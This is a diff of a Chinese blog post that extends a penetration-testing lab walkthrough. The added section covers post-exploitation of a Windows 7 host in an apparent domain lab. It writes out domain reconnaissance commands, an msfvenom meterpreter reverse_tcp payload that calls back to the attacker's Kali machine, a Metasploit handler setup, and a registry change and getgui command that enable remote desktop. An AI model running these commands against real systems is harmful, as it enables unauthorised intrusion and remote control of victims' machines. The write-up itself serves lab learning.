@@ -196,7 +196,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.5k 字
+      1.8k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      18
+      21
        分钟
     </span>
   
@@ -248,7 +248,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年4月6日 晚上
+                  本文最后更新于：2021年4月7日 上午
                 
               </p>
             
@@ -360,7 +360,15 @@
 <p><img src="https://i.loli.net/2021/03/18/N21VQTJFhci98kO.png" srcset="/img/loading.gif"></p>
 <p>外网大概就是到这里0。0，内网还在研究</p>
 <h1 id="对拿到的主机进行信息收集"><a href="#对拿到的主机进行信息收集" class="headerlink" title="对拿到的主机进行信息收集"></a>对拿到的主机进行信息收集</h1><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">whoami					<span class="hljs-meta"># 查看权限；用户为god；权限为administrator</span><br>ipconfig				<span class="hljs-meta"># 看网卡</span><br>net config Workstation	<span class="hljs-meta"># 查看当前登录域及登录用户信息</span><br>net <span class="hljs-built_in">view</span> /domain:god	<span class="hljs-meta"># 查看域成员</span><br></code></pre></td></tr></table></figure>
-<p>然后是利用msf和cs</p>
+<p>然后是利用msf和cs:<br>msf生成一个payload上传到win7并执行，得到msf的session（也可以用cs生成）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 这里的IP是攻击机也就是kali的ip，端口则是监听的端口：</span><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.244.128 LPORT=6666 -f exe -o hhh.exe<br><span class="hljs-meta">#</span><span class="bash"> 生成完毕给他777权限：</span><br>chmod 777 hhh.exe<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/07/sIcoH1ZxDtWFORq.png" srcset="/img/loading.gif" alt="把他上传到win7"></p>
+<p>然后在msf接收这个反弹shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler     							# 进入模块<br>set payload windows/x64/meterpreter_reverse_tcp		   	# 设置payload模块<br>set payload windows/meterpreter/reverse_tcp     		#（上一个payload有问题，我们用这个）<br>set lhost 192.168.244.128     							# 设置kali的地址<br>set lport 6666        									# 设置监听的端口<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/07/FmK9x4pGSjhtv2e.png" srcset="/img/loading.gif"></p>
+<p>然后在win7执行hhh.exe就可以拿到反弹shell了</p>
+<p><img src="https://i.loli.net/2021/04/07/mDq8K1uaRjpzTFy.png" srcset="/img/loading.gif"><br><a target="_blank" rel="noopener" href="https://www.mrwu.red/web/2674.html">msf后渗透利用命令|MrWu</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 也在shell里先打开3389端口，再远程连接：</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f				 # 开启3389<br>netstat -ano |findstr 3389	 	# 查看端口是否打开<br><span class="hljs-meta">#</span><span class="bash"> 不过用这个方法再使用kali的rdesktop连接失败了--，大概是存在waf，还是回头使用ms好f了</span><br>exploit -j						# 把msf挂在后台运行<br>run getgui -e    				# msf开启远程桌面<br><span class="hljs-meta">#</span><span class="bash"> 远程连接！00</span><br>rdesktop 192.168.244.134<br></code></pre></td></tr></table></figure>
 
             </div>
             <hr>
